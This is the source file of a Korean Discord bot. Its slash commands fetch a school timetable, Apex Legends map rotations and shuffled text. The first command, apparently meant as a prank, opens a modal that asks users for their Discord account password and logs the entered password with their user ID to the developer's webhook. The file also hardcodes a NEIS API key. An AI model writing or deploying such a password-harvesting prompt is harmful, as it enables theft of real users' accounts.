import {
	createElement,
	useString, useNumber, useInteger, useDescription,
	Message, Embed, Field, Modal, Button, Input, Row,
	useButton, useModal, useInput,
} from 'slshx';
import {
	ALS_API, NEIS_API, WebLogger,
	setTweaks, formatMinutes, escapers, randomInt
} from "./modules/tweak_functions.js";
setTweaks(self);



export function 빠빱윈또우뻐뜬() {
	const [popupPassword, popupPassword_value] = useInput();
	const popupWindow = useModal((interaction, env) => {
		const Logger = new WebLogger(env.LOGHOOK_ID, env.LOGHOOK_TOKEN);
		Logger.log(`<@${interaction.member.user.id}> | 빠빱\\_윈또우\\_뻐뜬 > \`\`${escapers.backtick(popupPassword_value)}\`\``);
		return (
			<Message ephemeral>{`<@${interaction.member.user.id}>`}, 매우 즐거운 귀하의 계정! 당국이 계정을 안전하게 보호할 것이다 입니다.</Message>
		);
	});
	const popupWindowButton = useButton(() => (
		<Modal id={popupWindow} title="이것은 빠빱_윈또우 이다">
			<Input
				id={popupPassword}
				label="Discord 계정 비밀번호를 입력해주세요"
				required
			>
			</Input>
		</Modal>
	));
	
	return () => (
		<Message>
			빠빱\_윈또우\_뻐뜬
			<Row>
				<Button id={popupWindowButton} primary>popup_window_button</Button>
			</Row>
		</Message>
	);
};
export function 시간표() {
	const date = Intl.DateTimeFormat('ko-KR', {
		dateStyle: 'long',
		timeZone: "Asia/Seoul",
	}).format(new Date());
	const options = {
		"ATPT_OFCDC_SC_CODE": "J10" /*useString("지역코드")*/,
		"SD_SCHUL_CODE": "7530474" /*useInteger("학교코드")*/,
		"GRADE": useInteger("학년"),
		"CLASS_NM": useInteger("반"),
		"ALL_TI_YMD": date.replace(/[년월일]\s?/g, '')
	};
	const Timetable = props => {
		if(!Object.keys(props.data.error).length) {
			return (
				<Embed
					title={
						props.type === "normal"?
							`:calendar_spiral: ${props.data.timetables[0].GRADE}학년 ${props.data.timetables[0].CLASS_NM}반 시간표`
							:
							`:calendar_spiral: 특수학급 시간표`
					}
					footer={`${date} 시간표`}
				>
					{
						props.data.timetables.map((time, index) => {
							return <Field name={`${index+1}교시`}>
								{time.ITRT_CNTNT}
							</Field>
						})
					}
				</Embed>
			);
		} else {
			return (
				<Embed
					title={
						props.data.error.CODE === "INFO-200"?
							props.type === "normal"?
								":calendar_spiral: 오늘은 원반 시간표가 없습니다."
								:
								":calendar_spiral: 오늘은 특수학급 시간표가 없습니다."
							:
							"시간표를 불러오는 중에 오류가 발생했습니다."
					}
					footer={`${date} 시간표`}
				>
					{props.data.error.MESSAGE}
				</Embed>
			);
		}
	};

	return async function*(interaction, env) {
		if(!["901544586990743632", "868813672154288128"].includes(interaction?.guild_id)) {
			return <Message>이 명령어는 현재 미공개 상태이며 개발자 서버에서만 이용할 수 있습니다.</Message>;
		}
		yield;
		const NIES = new NEIS_API("4243226e82884f239ce39a5d454d5c42");
		const [nData, sData] = [await NIES.send("hisTimetable", options), await NIES.send("spsTimetable", options)];
		return (
			<Message>
				<Timetable
					type="normal"
					data={nData}
				/>
				<Timetable
					type="special"
					data={sData}
				/>
			</Message>
		);
	};
};
export function 맵() {
	const gamemode = useString("게임모드");

	return async function*(interaction, env) {
		yield;
		const ALS = new ALS_API(env.ALS_TOKEN);
		const als = await ALS.send("maprotation", {version: 2});
		const data = als[gamemode ?? "battle_royale"];
		return (
			<Message>
				<Embed
					title={`:map: 현재 맵: \`${data.current.map}\``}
					image={data.current.asset}
					footer={`이 맵은 ${formatMinutes(data.current.DurationInMinutes)} 동안 유지됩니다`}
				>
					{`<t:${data.current.start}:R>에 시작되었습니다.`}
				</Embed>
				<Embed
					title={`:map: 다음 맵: \`${data.next.map}\``}
					image={data.next.asset}
					footer={`이 맵은 ${formatMinutes(data.next.DurationInMinutes)} 동안 유지됩니다`}
				>
					{`> <t:${data.next.start}:R>에 시작됩니다.`}
				</Embed>
			</Message>
		);
	};
};
export function 금은가야() {
	const type = useString("기법");
	const msg = useString("메시지");
	const repeat = useNumber("반복") ?? 1;

	switch(type){
		case "shuffle": {
			return ()=> <Message>{escapers.all(msg.repeat(repeat).shuffle().slice(0, 1999))}</Message>;
		};
		case "reverse": {
			return ()=> <Message>{escapers.all(msg.repeat(repeat).reverse().slice(0, 1999))}</Message>;
		};
		default: {
			return ()=> <Message>{type}은(는) 존재하지 않는 타입입니다.</Message>;
		};
	};
};
export function 도움말() {
	return ()=> (
		<Message>
			<Embed
				title="도움말 목록을 불러오는 중입니다..."
			>
				{`예상 완료 시간 : \`${formatMinutes(randomInt(96854851, 6857485141))}\``}
			</Embed>
		</Message>
	);
};